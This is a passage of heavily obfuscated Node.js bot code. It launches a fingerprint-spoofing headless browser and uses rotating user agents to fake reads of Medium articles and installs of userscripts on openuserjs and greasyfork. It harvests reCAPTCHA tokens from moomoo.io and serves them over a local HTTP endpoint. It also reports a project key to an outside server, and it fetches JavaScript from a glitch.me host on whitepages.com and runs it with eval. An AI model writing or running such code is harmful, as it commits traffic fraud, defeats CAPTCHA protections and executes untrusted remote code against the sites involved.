      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + W(0x8, 'gd[N') + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + V(0x10) + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + V(0xa),
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + X(0x6) + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + V(0xc) + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x2090 + 0x2 * -0x7a7 + 0x16 * 0x22d
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1bab + 0xd6 * 0x3 + -0x3 * 0xa0f)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x35 + -0x569 * 0x2 + 0x4f * 0x25), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x3 * -0x9f5 + 0xd55 * 0x2 + -0x133 * -0x3), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const Y = b,
          r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1 * 0x275 + 0x1ee7 + -0x215c;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })[Y(0x14, ')$j7')](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x743 + -0x1c4f + 0x704 * 0x3; w < getRandomInt(-0x7f * 0x26 + -0x19d8 + 0x1 * 0x2cb3, -0x152 * -0x1d + -0x116 * 0x17 + -0xd4b); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1389 * 0x8 + 0xdbc0 + -0x1 * 0x8da8);
        }
      }();
    }, 0x2659 + 0x4db * -0x5 + -0x6d7 * 0x2), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x20f + 0x19 * -0xd1 + -0x92d * -0x2;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x2 * 0x9a4 + -0xbb2 + 0x1 * -0x796, -0x249d + -0x18d * 0x4 + 0x2b03)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x40dd + 0x21 * 0x573 + -0xf0 * 0x88);
    }, 0x305 * -0x1 + -0x1f65 + 0x6 * 0x5cd), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0xc7b + -0x18d1 + 0x2 * 0x62b;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x116 * 0xc + 0x21a + -0x36a), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1b09 + 0x5 * -0x791 + 0xacc), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0xcf2 * -0x12 + -0xad4b7 + 0x1 * 0x19795b);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1abe + 0x4cf + -0x1f29);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1630 + 0x85d * 0x3 + 0x21f * -0x1);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x2a5b + 0x3e65 + 0x926 * -0x8);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0xf2 * -0x14 + -0xc4 + 0x306 * -0x6);
    let h = e[f];
    if (b['rSHXZo'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1a21 + 0x1 * -0x149 + 0x1b6a * 0x1, s, t, u = 0x1478 + 0x1 * -0x24cd + -0x25 * -0x71; t = n['charAt'](u++); ~t && (s = r % (-0x24af * 0x1 + 0x1d7e + 0x2d * 0x29) ? s * (-0x4 * 0x595 + 0x1f25 + -0x891) + t : t, r++ % (-0xb * -0x118 + 0x1 * 0x33b + -0xf3f)) ? p += String['fromCharCode'](-0x352 * -0xb + 0x163 * 0x5 + 0x2a76 * -0x1 & s >> (-(-0x98b * -0x4 + -0x8a8 + -0x3 * 0x9d6) * r & 0x485 + -0x6d2 + 0x253 * 0x1)) : -0x2ad * 0x1 + 0x2 * 0x6e5 + -0xb1d) {
          t = o['indexOf'](t);
        }
        for (let v = 0x15ba + -0x1 * -0x1aee + 0x48 * -0xad, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x21a + 0x4d6 + -0x6e0))['slice'](-(0x1 * -0x644 + 0x2c * 0x22 + 0x6e));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1218 + 0x345 * 0x5 + -0x3 * 0xb7b,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x6d9 + 0xe5 * 0xe + -0x227 * 0x9; u < -0x174 + -0x5aa + 0x81e; u++) {
          p[u] = u;
        }
        for (u = 0x1ffc + 0x6b * -0x53 + -0x4d * -0x9; u < -0xb4b + -0x503 * -0x3 + 0x12 * -0x27; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x16f6 + -0x1896 + 0x308c), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0xd48 + 0x222e + -0x14e6, q = 0x1c1d + 0x72d * 0x2 + 0x2a77 * -0x1;
        for (let v = 0x2077 + -0xbd0 + 0x11 * -0x137; v < n['length']; v++) {
          u = (u + (0xafe + -0x1 * -0x2352 + -0x2e4f)) % (0x22da + 0x1d8e + -0x3f68), q = (q + p[u]) % (0x2e8 * -0x8 + 0x4 * -0x3b5 + 0x2714), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x13c9 * 0x1 + 0x349 + -0x1612)]);
        }
        return t;
      };
      b['TRJAAw'] = m, c = arguments, b['rSHXZo'] = !![];
    }
    const j = e[-0x2 * 0xf76 + -0xdc0 + 0x2cac],
      k = f + j,
      l = c[k];
    return !l ? (b['zNIyzV'] === undefined && (b['zNIyzV'] = !![]), h = b['TRJAAw'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
doFlags['doOUJS'] && ((async () => {
  const a0 = b;
  async function f() {
    const Z = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0xd5a * 0x1 + 0x1bdc + -0x2935) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x7d * 0x7 + -0x87e * 0x3 + -0x1 * -0x1610));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x5 * -0x457 + -0x6c8 + 0x1c7b, D['indexOf']('\x20'));
        return B ? E['slice'](-0x718 + -0xec7 + -0x1fd * -0xb, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x24 * -0x14b + -0xf1 * -0x35 + -0x25 * 0x18d),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': Z(0x7) + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x32 * 0x116 + 0x1c7f + 0x40dd),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object[Z(0x11)](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      a0(0x19, 'PpSm') + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
